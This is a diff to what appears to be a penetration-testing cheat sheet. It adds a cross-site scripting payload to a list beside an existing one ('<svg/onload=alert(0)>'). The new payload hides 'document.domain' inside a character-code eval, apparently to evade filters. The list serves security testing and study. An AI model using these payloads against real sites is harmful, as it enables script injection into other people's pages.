@@ -2177,6 +2177,9 @@ Manually testing for XXE vulnerabilities generally involves
 - ```HTML
   <svg/onload=alert(0)>
   ```
+- ```HTML
+  <script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
+  ```
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
